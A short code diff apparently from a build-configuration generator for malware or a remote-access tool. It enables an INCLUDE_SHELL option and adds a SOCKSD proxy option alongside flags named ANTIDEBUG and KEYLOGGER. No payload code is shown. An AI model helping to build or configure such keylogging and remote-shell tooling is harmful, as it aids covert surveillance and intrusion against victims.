@@ -116,7 +116,8 @@ int main(int argc, char *argv[]) {
 	config_option("DEBUG", 0);
 	config_option("ANTIDEBUG", 1);
 	config_option("KEYLOGGER", 1);
-	config_option("INCLUDE_SHELL", 0);
+	config_option("SOCKSD", 0);
+	config_option("INCLUDE_SHELL", 1);
 
 	printf("#endif\n");
 
